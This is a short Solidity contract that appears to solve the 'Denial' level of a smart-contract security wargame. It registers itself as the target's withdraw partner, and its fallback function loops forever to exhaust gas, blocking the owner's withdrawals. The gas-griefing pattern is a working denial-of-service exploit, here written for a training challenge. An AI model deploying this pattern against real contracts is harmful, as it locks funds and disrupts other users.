// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/20-Denial/Denial.sol";

contract DenialAttack {
    Denial d;

    constructor(address payable _target) {
        d = Denial(_target);
    }

    function attackDenial() external {
        d.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // waste gas so that tx will fail.
        while (true) {}
    }
}
